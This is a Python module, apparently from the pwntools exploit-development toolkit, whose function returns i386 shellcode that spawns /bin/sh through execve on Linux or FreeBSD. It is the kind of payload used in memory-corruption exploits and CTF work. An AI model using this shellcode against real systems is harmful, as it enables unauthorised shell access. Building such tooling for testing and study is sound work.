from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def sh(clear_ecx = True, os = None):
    """Args: [clear_ecx = True]
    Spawn a shell.

    Set clear_ecx to False to shave of a few bytes if ecx is already 0.
    """

    if os not in ['linux', 'freebsd']:
        bug('OS was neither linux or freebsd')

    if os == 'freebsd':
        if not clear_ecx:
            return """
            ; eax = "/bin//sh"
            push ecx
            push `//sh`
            push `/bin`
            mov eax, esp

            ; execve("/bin//sh", {junk, 0}, {0});
            push ecx
            push esp
            push esp
            push eax
            push ecx
            push SYS_execve
            pop eax
            int 0x80"""
        else:
            return """
            ; ecx = "/bin//sh"
            xor eax, eax
            push eax
            push `//sh`
            push `/bin`
            mov ecx, esp

            ; execve("/bin//sh", {junk, 0}, {0});
            push eax
            push esp
            push esp
            push ecx
            push eax
            mov al, SYS_execve
            int 0x80"""

    if clear_ecx:
        clear_ecx = 'xor ecx, ecx\n'
    else:
        clear_ecx = ''

    return """
        ;; Clear eax, ecx, edx
        %simul ecx

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`

        ;; Call execve
        mov al, SYS_execve
        mov ebx, esp
        int 0x80
""" % clear_ecx
